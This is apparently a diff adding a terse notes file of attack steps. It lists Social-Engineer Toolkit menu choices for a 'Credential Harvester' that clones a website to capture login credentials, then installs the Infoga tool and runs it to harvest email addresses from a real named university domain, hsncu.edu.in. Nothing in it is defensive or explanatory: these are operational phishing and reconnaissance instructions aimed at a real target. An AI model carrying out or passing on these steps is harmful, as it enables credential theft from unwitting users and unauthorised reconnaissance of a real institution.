@@ -1,0 +1,22 @@
+#Credential Harvester Attack
+ifconfig
+
+setoolkit
+1 (Social enginerring attack)
+2 (Website Attack Vector)
+3 (Credential Harvester Attack Method)
+2 (Site Cloner)
+
+write the ip address
+enter the url you want to clone
+-----------------------------------------------------------------
+
+#Infoga
+
+git clone https://github.com/GiJ03/Infoga
+ls
+cd Infoga
+ls
+python setup.py install
+python infoga.py --domain hsncu.edu.in --source google --verbose 3
+python infoga.py --domain hsncu.edu.in --verbose 3
